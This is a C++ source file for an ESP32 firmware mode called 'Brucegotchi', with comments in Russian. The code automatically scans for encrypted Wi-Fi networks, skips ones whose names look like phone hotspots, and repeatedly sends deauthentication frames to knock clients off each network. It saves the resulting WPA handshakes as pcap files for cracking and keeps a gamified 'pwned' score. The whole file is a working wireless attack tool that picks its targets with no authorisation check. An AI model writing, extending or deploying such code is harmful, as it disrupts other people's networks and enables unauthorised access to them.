#include "brucegotchi.h"
#include "core/display.h"
#include "core/led_control.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "sniffer.h"
#include "wifi_atks.h"
#include <Arduino.h>
#include <Preferences.h>
#include <algorithm>
#include <esp_wifi.h>
#include <vector>

extern uint8_t targetBssid[6];

struct TargetAP {
    String ssid;
    uint8_t bssid[6];
    uint8_t channel;
    int32_t rssi;
    int authmode;
};

static uint64_t getMacKey(const uint8_t *mac) {
    uint64_t key = 0;
    for (int i = 0; i < 6; ++i) { key = (key << 8) | (uint64_t)mac[i]; }
    return key;
}

// --- ФИЛЬТР СМАРТФОНОВ ---
bool isSmartphone(String ssid) {
    String s = ssid;
    s.toLowerCase();
    if (s.indexOf("iphone") >= 0 || s.indexOf("android") >= 0 || s.indexOf("galaxy") >= 0 ||
        s.indexOf("redmi") >= 0 || s.indexOf("poco") >= 0 || s.indexOf("pixel") >= 0 ||
        s.indexOf("vivo") >= 0 || s.indexOf("oppo") >= 0 || s.indexOf("realme") >= 0 ||
        s.indexOf("huawei") >= 0 || s.indexOf("honor") >= 0 || s.indexOf("macbook") >= 0 ||
        s.indexOf("ipad") >= 0 || s.indexOf("hotspot") >= 0 || s.indexOf("tethering") >= 0 ||
        s.indexOf("oneplus") >= 0 || s.indexOf("zte") >= 0 || s.indexOf("tecno") >= 0 ||
        s.indexOf("infinix") >= 0) {
        return true;
    }
    return false;
}

Preferences prefs;
uint32_t total_pwned = 0;
uint32_t session_captured = 0;
bool show_stats = false;

// ПЕРЕМЕННЫЕ ЭКРАНА
String current_face = "(O_O)";
String current_text = "Waking up...";
String current_target = ""; // Выделенная переменная для цели

void drawCurrentMood() {
    tft.drawPixel(0, 0, 0);
    drawMainBorderWithTitle("Brucegotchi", true);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    if (show_stats) {
        int level = (total_pwned / 5) + 1;
        tft.setTextSize(3);
        tft.setCursor(20, 40);
        tft.printf("Level: %d", level);

        tft.setTextSize(2);
        tft.setCursor(20, 90);
        tft.printf("Total Pwned: %d", total_pwned);
        tft.setCursor(20, 120);
        tft.printf("Session Pwns: %d", session_captured);

        uint32_t up = millis() / 1000;
        tft.setCursor(20, 150);
        tft.printf("Uptime: %02dm %02ds", (up % 3600) / 60, up % 60);

        tft.setTextSize(1);
        tft.setCursor(10, tftHeight - 20);
        tft.print("Tap screen to return to Pet");
    } else {
        // --- ОТРИСОВКА ЦЕЛИ (НАВЕРХУ) ---
        if (current_target != "") {
            tft.setTextSize(2);
            String tgt_str = "Tgt: " + current_target;
            // Обрезаем слишком длинные имена, чтобы не ломать экран
            if (tgt_str.length() > 24) tgt_str = tgt_str.substring(0, 21) + "...";

            int tgtWidth = tgt_str.length() * 12;
            tft.setCursor((tftWidth - tgtWidth) / 2, 40);
            tft.print(tgt_str);
        }

        // --- МОРДОЧКА (В ЦЕНТРЕ) ---
        tft.setTextSize(3);
        int faceWidth = current_face.length() * 18;
        tft.setCursor((tftWidth - faceWidth) / 2, tftHeight / 2 - 20);
        tft.print(current_face);

        // --- СТАТУС (ПОД МОРДОЧКОЙ) ---
        tft.setTextSize(2);
        int textWidth = current_text.length() * 12;
        tft.setCursor((tftWidth - textWidth) / 2, tftHeight / 2 + 30);
        tft.print(current_text);

        // --- СЧЕТЧИК И УРОВЕНЬ (ВНИЗУ) ---
        tft.setTextSize(1);
        tft.setCursor(10, tftHeight - 20);
        tft.printf("Lvl: %d | Pwned: %d", (total_pwned / 5) + 1, session_captured);
    }
}

void setMood(String face, String text) {
    current_face = face;
    current_text = text;
    Serial.printf(
        "[Brucegotchi] [DISPLAY] %s | %s | Pwns: %d\n", face.c_str(), text.c_str(), session_captured
    );
    drawCurrentMood();
}

bool checkInput() {
    if (check(EscPress)) return true;
    if (check(SelPress)) {
        show_stats = !show_stats;
        drawCurrentMood();
        vTaskDelay(300 / portTICK_PERIOD_MS);
    }
    return false;
}

bool smartDelay(uint32_t ms) {
    uint32_t start = millis();
    while (millis() - start < ms) {
        if (checkInput()) return true;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
    return false;
}

void brucegotchi_start() {
    Serial.println("\n[Brucegotchi] === STARTING DESKTOP SNIPER v4.0 (3 Min, 30s Deauth) ===\n");

    prefs.begin("brucegotchi", false);
    total_pwned = prefs.getUInt("pwned", 0);
    session_captured = 0;
    show_stats = false;
    current_target = "";
    int empty_scan_streak = 0;
    int missed_streak = 0;

    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        handshakeFs = &SD;
    } else {
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }

    if (!handshakeFs->exists("/BrucePCAP/handshakes")) {
        handshakeFs->mkdir("/BrucePCAP");
        handshakeFs->mkdir("/BrucePCAP/handshakes");
    }

    sniffer_prepare_storage(handshakeFs, !isLittleFS);
    sniffer_set_mode(SnifferMode::HandshakesOnly);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    beginLed();

    while (true) {
        // --- РАЗВЕДКА ---
        current_target = "";
        setLedAttackMode(1, CRGB(255, 255, 0));
        setMood("(O_O)", "Scanning air...");

        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_MODE_STA);
        WiFi.disconnect();
        vTaskDelay(300 / portTICK_PERIOD_MS);

        int nets = WiFi.scanNetworks(false, true);
        std::vector<TargetAP> targets;

        for (int i = 0; i < nets; i++) {
            if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN) {
                if (isSmartphone(WiFi.SSID(i))) {
                    Serial.printf("[Brucegotchi] Filtered out mobile hotspot: %s\n", WiFi.SSID(i).c_str());
                    continue;
                }

                TargetAP ap;
                ap.ssid = WiFi.SSID(i);
                memcpy(ap.bssid, WiFi.BSSID(i), 6);
                ap.channel = WiFi.channel(i);
                ap.rssi = WiFi.RSSI(i);
                targets.push_back(ap);
            }
        }

        std::sort(targets.begin(), targets.end(), [](const TargetAP &a, const TargetAP &b) {
            return a.rssi > b.rssi;
        });

        if (targets.empty()) {
            empty_scan_streak++;
            if (empty_scan_streak >= 3) setMood("( -.-)zZ", "Sleeping...");
            else setMood("(-_-)", "Air is empty...");
            if (smartDelay(3000)) break;
            continue;
        } else {
            empty_scan_streak = 0;
        }

        // --- ОХОТА ---
        bool manual_exit = false;
        for (auto &target : targets) {
            if (checkInput()) {
                manual_exit = true;
                break;
            }

            String safeSsid = sanitizeSsid(target.ssid.c_str());
            char hsFileName[128];
            snprintf(
                hsFileName,
                sizeof(hsFileName),
                "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_%s.pcap",
                target.bssid[0],
                target.bssid[1],
                target.bssid[2],
                target.bssid[3],
                target.bssid[4],
                target.bssid[5],
                safeSsid.c_str()
            );
            String hsFilePath = String(hsFileName);

            char unkFileName[128];
            snprintf(
                unkFileName,
                sizeof(unkFileName),
                "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X_UNKNOWN.pcap",
                target.bssid[0],
                target.bssid[1],
                target.bssid[2],
                target.bssid[3],
                target.bssid[4],
                target.bssid[5]
            );
            String unkFilePath = String(unkFileName);

            if (handshakeFs->exists(hsFilePath)) continue;

            current_target = safeSsid;
            hsTracker = HandshakeTracker();

            BeaconList targetBeacon;
            memcpy(targetBeacon.MAC, target.bssid, 6);
            targetBeacon.channel = target.channel;
            registeredBeacons.clear();
            registeredBeacons.insert(targetBeacon);

            setHandshakeSniffer();
            portENTER_CRITICAL(&clientsMux);
            targetClients.clear();
            portEXIT_CRITICAL(&clientsMux);

            memcpy(targetBssid, target.bssid, 6);
            memcpy(ap_record.bssid, target.bssid, 6);
            ap_record.primary = target.channel;

            WiFi.mode(WIFI_MODE_APSTA);
            vTaskDelay(100 / portTICK_PERIOD_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(sniffer);
            esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(200 / portTICK_PERIOD_MS);

            // --- БЫСТРАЯ ОЦЕНКА (10 сек) ---
            setLedAttackMode(1, CRGB_Colors::Blue);
            setMood("(-_-)", "Watching...");

            uint32_t wait_start = millis();
            bool has_clients = false;
            while (millis() - wait_start < 10000) {
                if (checkInput()) {
                    manual_exit = true;
                    break;
                }
                portENTER_CRITICAL(&clientsMux);
                int num_clients = targetClients.size();
                portEXIT_CRITICAL(&clientsMux);
                if (num_clients > 0) {
                    has_clients = true;
                    break;
                }
                vTaskDelay(200 / portTICK_PERIOD_MS);
            }

            if (manual_exit) break;

            // --- ШТУРМ (180 сек = 3 МИНУТЫ) ---
            setMood("(>_<)", "Hunting 3m!");
            markHandshakeReady(getMacKey(target.bssid));

            uint32_t attack_start = millis();
            uint32_t last_deauth = 0;
            bool success = false;

            while (millis() - attack_start < 180000) {
                if (checkInput()) {
                    manual_exit = true;
                    break;
                }

                // Обновляем статус успеха в фоне, но НЕ ВЫХОДИМ ИЗ ЦИКЛА!
                if ((hsTracker.msg1 && hsTracker.msg2) || (hsTracker.msg3 && hsTracker.msg4)) {
                    success = true;
                }

                // ДЕАУТ КАЖДЫЕ 30 СЕКУНД (10 пакетов)
                if (millis() - last_deauth > 30000) {
                    last_deauth = millis();
                    setLedAttackMode(3, CRGB_Colors::Red);

                    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

                    if (has_clients) {
                        wsl_bypasser_send_raw_frame(&ap_record, target.channel);
                        memcpy(&deauth_frame[10], target.bssid, 6);
                        memcpy(&deauth_frame[16], target.bssid, 6);
                        for (int i = 0; i < 10; i++) {
                            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                            vTaskDelay(10 / portTICK_PERIOD_MS);
                        }
                    } else {
                        memcpy(&deauth_frame[10], target.bssid, 6);
                        memcpy(&deauth_frame[16], target.bssid, 6);
                        for (int i = 0; i < 10; i++) {
                            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                            vTaskDelay(10 / portTICK_PERIOD_MS);
                        }
                    }

                    setMood("(>_<)", "Pew Pew Pew!");
                    vTaskDelay(500 / portTICK_PERIOD_MS);

                    // Если уже поймали хендшейк, пусть диод мигает зеленым, иначе синим
                    if (success) setLedAttackMode(2, CRGB_Colors::Green);
                    else setLedAttackMode(1, CRGB_Colors::Blue);

                    setMood("(-_-)", "Listening...");
                }
                vTaskDelay(100 / portTICK_PERIOD_MS);
            }

            if (manual_exit) break;
            esp_wifi_set_promiscuous(false);
            sniffer_wait_for_flush(400);

            // --- ИТОГИ ---
            if (success) {
                missed_streak = 0;
                session_captured++;
                total_pwned++;
                prefs.putUInt("pwned", total_pwned);

                if (unkFilePath != hsFilePath && handshakeFs->exists(unkFilePath)) {
                    handshakeFs->rename(unkFilePath, hsFilePath);
                }

                if (hsTracker.msg1 && hsTracker.msg2 && hsTracker.msg3 && hsTracker.msg4) {
                    setMood("(^__^)", "Gotcha 4/4!");
                } else {
                    setMood("(^__^)", "Gotcha (Usable)");
                }

                setLedAttackMode(2, CRGB_Colors::Green);
                if (smartDelay(4000)) {
                    manual_exit = true;
                    break;
                }
            } else {
                missed_streak++;
                if (missed_streak >= 3) setMood("( ಠ_ಠ)", "Angry!");
                else setMood("(T_T)", "Missed...");

                // УДАЛЯЕМ МУСОР ЕСЛИ НИЧЕГО НЕ ПОЙМАЛИ
                if (handshakeFs->exists(hsFilePath)) handshakeFs->remove(hsFilePath);
                if (handshakeFs->exists(unkFilePath)) handshakeFs->remove(unkFilePath);
                SavedHS.erase(hsFilePath);
                SavedHS.erase(unkFilePath);
                if (smartDelay(2000)) {
                    manual_exit = true;
                    break;
                }
            }
        }
        if (manual_exit) break;
    }

    prefs.end();
    current_target = "";
    setLedAttackMode(0, CRGB_Colors::Black);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}
